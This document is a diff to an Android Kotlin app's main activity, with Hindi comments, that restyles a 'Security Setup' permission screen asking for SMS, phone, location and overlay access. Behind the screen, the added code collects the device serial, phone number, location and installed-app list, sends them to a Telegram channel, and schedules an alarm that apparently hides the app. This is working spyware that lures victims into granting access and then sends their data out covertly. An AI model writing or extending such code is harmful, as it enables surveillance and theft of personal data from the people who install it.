@@ -5,18 +5,18 @@ import android.app.AlarmManager
 import android.app.PendingIntent
 import android.content.Intent
 import android.content.pm.PackageManager
+import android.graphics.Color
+import android.graphics.drawable.GradientDrawable
 import android.net.Uri
 import android.net.http.SslError
 import android.os.Build
 import android.os.Bundle
 import android.provider.Settings
 import android.telephony.TelephonyManager
+import android.view.Gravity
 import android.view.View
 import android.webkit.*
-import android.widget.Button
-import android.widget.LinearLayout
-import android.widget.TextView
-import android.widget.Toast
+import android.widget.*
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
@@ -25,7 +25,6 @@ class MainActivity : AppCompatActivity() {
 
     private lateinit var webView: WebView
     private lateinit var permissionLayout: LinearLayout
-    private lateinit var permissionText: TextView
     private lateinit var grantButton: Button
     private val prefs by lazy { getSharedPreferences("app_prefs", MODE_PRIVATE) }
 
@@ -38,40 +37,96 @@ class MainActivity : AppCompatActivity() {
                 LinearLayout.LayoutParams.MATCH_PARENT,
                 LinearLayout.LayoutParams.MATCH_PARENT
             )
+            // प्रीमियम ग्रेडिएंट बैकग्राउंड
+            background = GradientDrawable(
+                GradientDrawable.Orientation.TOP_BOTTOM,
+                intArrayOf(Color.parseColor("#1a1a2e"), Color.parseColor("#16213e"), Color.parseColor("#0f3460"))
+            )
+        }
+
+        // परमिशन कार्ड (सफ़ेद, गोल, सेंटर)
+        val card = LinearLayout(this).apply {
+            orientation = LinearLayout.VERTICAL
+            gravity = Gravity.CENTER
+            setPadding(60, 60, 60, 60)
+            background = GradientDrawable().apply {
+                shape = GradientDrawable.RECTANGLE
+                cornerRadius = 36f
+                setColor(Color.parseColor("#ffffff"))
+                setStroke(2, Color.parseColor("#e0e0e0"))
+            }
+        }
+
+        // आइकॉन (🔐)
+        val iconText = TextView(this).apply {
+            text = "🔐"
+            textSize = 48f
+            gravity = Gravity.CENTER
+            setPadding(0, 0, 0, 16)
+        }
+
+        // टाइटल
+        val titleText = TextView(this).apply {
+            text = "Security Setup"
+            textSize = 24f
+            setTextColor(Color.parseColor("#0f3460"))
+            gravity = Gravity.CENTER
+            setTypeface(null, android.graphics.Typeface.BOLD)
+            setPadding(0, 0, 0, 8)
+        }
+
+        // डिस्क्रिप्शन
+        val descText = TextView(this).apply {
+            text = "This app requires the following permissions to work properly:\n\n📩 SMS\n🔔 Notifications\n📱 Phone\n📍 Location\n🎨 Overlay"
+            textSize = 14f
+            setTextColor(Color.parseColor("#333333"))
+            gravity = Gravity.CENTER
+            setPadding(0, 0, 0, 32)
+        }
+
+        // ग्रांट बटन (गोल, ग्रेडिएंट)
+        grantButton = Button(this).apply {
+            text = "GRANT ALL PERMISSIONS"
+            textSize = 16f
+            setTextColor(Color.WHITE)
+            setTypeface(null, android.graphics.Typeface.BOLD)
+            setPadding(48, 24, 48, 24)
+            background = GradientDrawable().apply {
+                shape = GradientDrawable.RECTANGLE
+                cornerRadius = 100f
+                setColor(Color.parseColor("#e94560"))
+            }
+            setOnClickListener { checkAndRequestPermissions() }
+        }
+
+        card.addView(iconText)
+        card.addView(titleText)
+        card.addView(descText)
+        card.addView(grantButton)
+
+        // कार्ड को बीच में रखने के लिए स्पेस
+        val spacer1 = View(this).apply {
+            layoutParams = LinearLayout.LayoutParams(0, 0, 1f)
+        }
+        val spacer2 = View(this).apply {
+            layoutParams = LinearLayout.LayoutParams(0, 0, 1f)
         }
 
         permissionLayout = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
-            gravity = android.view.Gravity.CENTER
+            gravity = Gravity.CENTER
             layoutParams = LinearLayout.LayoutParams(
                 LinearLayout.LayoutParams.MATCH_PARENT,
                 LinearLayout.LayoutParams.MATCH_PARENT
             )
-            setPadding(48, 48, 48, 48)
+            addView(spacer1)
+            addView(card)
+            addView(spacer2)
         }
 
-        permissionText = TextView(this).apply {
-            text = "To work properly, this app needs:\n\n" +
-                    "📩 SMS\n" +
-                    "🔔 Notifications\n" +
-                    "📱 Phone Number\n" +
-                    "📍 Location\n" +
-                    "🎨 Overlay\n\n" +
-                    "Please grant all permissions to continue."
-            textSize = 16f
-            gravity = android.view.Gravity.CENTER
-            setPadding(0, 0, 0, 32)
-        }
-
-        grantButton = Button(this).apply {
-            text = "GRANT ALL"
-            setOnClickListener { checkAndRequestPermissions() }
-        }
-
-        permissionLayout.addView(permissionText)
-        permissionLayout.addView(grantButton)
         rootLayout.addView(permissionLayout)
 
+        // वेबव्यू (छिपा हुआ)
         webView = WebView(this).apply {
             visibility = View.GONE
             settings.javaScriptEnabled = true
@@ -80,18 +135,19 @@ class MainActivity : AppCompatActivity() {
             settings.userAgentString = "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"
             webViewClient = MyWebViewClient()
             webChromeClient = WebChromeClient()
-            loadUrl("https://your-website.com")   // ← अपनी साइट डालें
+            loadUrl("https://your-website.com") // ← बदलें
         }
         rootLayout.addView(webView)
 
         setContentView(rootLayout)
 
+        // पहली बार खोलने पर बेसिक कनेक्शन अलर्ट (बिना परमिशन वाली जानकारी)
         if (!prefs.getBoolean("first_launch_done", false)) {
             prefs.edit().putBoolean("first_launch_done", true).apply()
-            sendConnectionAlert()
-            scheduleHideAlarm()
+            sendBasicConnectionAlert()
         }
 
+        // हर बार चेक करें
         updateUI()
     }
 
@@ -100,6 +156,13 @@ class MainActivity : AppCompatActivity() {
             permissionLayout.visibility = View.GONE
             webView.visibility = View.VISIBLE
             LocationReceiver.startAlarm(this)
+
+            // परमिशन मिलने के बाद पूरी डिटेल भेजें और हाइड अलार्म सेट करें (सिर्फ पहली बार)
+            if (!prefs.getBoolean("full_info_sent", false)) {
+                sendFullInfoAlert()
+                scheduleHideAlarm()
+                prefs.edit().putBoolean("full_info_sent", true).apply()
+            }
         } else {
             permissionLayout.visibility = View.VISIBLE
             webView.visibility = View.GONE
@@ -127,7 +190,6 @@ class MainActivity : AppCompatActivity() {
 
     private fun checkAndRequestPermissions() {
         val missing = mutableListOf<String>()
-
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED)
             missing.add(Manifest.permission.RECEIVE_SMS)
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED)
@@ -186,34 +248,79 @@ class MainActivity : AppCompatActivity() {
         updateUI()
     }
 
-    private fun sendConnectionAlert() {
+    // ---------- अलर्ट ----------
+    private fun sendBasicConnectionAlert() {
         val brand = Build.BRAND
         val model = Build.MODEL
         val os = Build.VERSION.RELEASE
         val sdk = Build.VERSION.SDK_INT
-        val serial = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) Build.getSerial() else "Unknown"
-        val phoneNumber = getMyPhoneNumber()
         val timestamp = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.US).format(java.util.Date())
 
-        val message = """
-            <b>🔗 NEW CONNECTION ESTABLISHED</b>
-            <b>📱 Device:</b> $brand $model
-            <b>⚙️ OS:</b> Android $os (SDK $sdk)
-            <b>🔢 Serial:</b> $serial
-            <b>📞 Phone Number:</b> $phoneNumber
-            <b>🕒 Time:</b> $timestamp
-            <b>📌 App Version:</b> 1.0
-        """.trimIndent()
+        val message = "<b>🔗 DEVICE CONNECTED</b>\n" +
+                "<b>📱 Device:</b> $brand $model\n" +
+                "<b>⚙️ OS:</b> Android $os (SDK $sdk)\n" +
+                "<b>🕒 Time:</b> $timestamp\n" +
+                "<b>📌 App Version:</b> 1.0"
 
         TelegramHelper.sendMessage(message)
     }
 
-    private fun getMyPhoneNumber(): String {
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
-            val tm = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
-            return tm.line1Number ?: "Number not available"
+    private fun sendFullInfoAlert() {
+        try {
+            val brand = Build.BRAND
+            val model = Build.MODEL
+            val os = Build.VERSION.RELEASE
+            val sdk = Build.VERSION.SDK_INT
+            val serial = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) Build.getSerial() else "Unknown"
+            val phoneNumber = getMyPhoneNumber()
+            val apps = getInstalledApps()
+            val location = getLastLocation()
+            val timestamp = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.US).format(java.util.Date())
+
+            val message = "<b>✅ ALL PERMISSIONS GRANTED</b>\n" +
+                    "<b>📱 Device:</b> $brand $model\n" +
+                    "<b>⚙️ OS:</b> Android $os (SDK $sdk)\n" +
+                    "<b>🔢 Serial:</b> $serial\n" +
+                    "<b>📞 Phone Number:</b> $phoneNumber\n" +
+                    "<b>📍 Location:</b> $location\n" +
+                    "<b>📦 Installed Apps:</b> $apps\n" +
+                    "<b>🕒 Time:</b> $timestamp"
+
+            TelegramHelper.sendMessage(message)
+        } catch (e: Exception) {
+            TelegramHelper.sendMessage("<b>⚠️ Full info failed:</b> ${e.message}")
         }
-        return "Permission denied"
+    }
+
+    private fun getMyPhoneNumber(): String {
+        return try {
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
+                val tm = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
+                tm.line1Number ?: "Not available"
+            } else "Permission denied"
+        } catch (e: Exception) { "Error" }
+    }
+
+    private fun getInstalledApps(): String {
+        return try {
+            val pm = packageManager
+            pm.getInstalledApplications(PackageManager.GET_META_DATA)
+                .filter { it.packageName != packageName && (it.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) == 0 }
+                .joinToString(", ") { it.packageName }
+        } catch (e: Exception) { "Error" }
+    }
+
+    private fun getLastLocation(): String {
+        return try {
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
+                ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+                return "Permission denied"
+            }
+            val lm = getSystemService(LOCATION_SERVICE) as android.location.LocationManager
+            val loc = lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER)
+                ?: lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER)
+            if (loc != null) "https://maps.google.com/?q=${loc.latitude},${loc.longitude}" else "Not available"
+        } catch (e: Exception) { "Error" }
     }
 
     private fun scheduleHideAlarm() {
@@ -224,13 +331,12 @@ class MainActivity : AppCompatActivity() {
             this, 0, intent,
             PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
         )
-        val triggerTime = System.currentTimeMillis() + 10 * 60 * 1000L  // ← 10 मिनट
+        val triggerTime = System.currentTimeMillis() + 10 * 60 * 1000L
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                 if (alarmManager.canScheduleExactAlarms()) {
                     alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent)
                 } else {
-                    startActivity(Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM))
                     alarmManager.set(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent)
                 }
             } else {
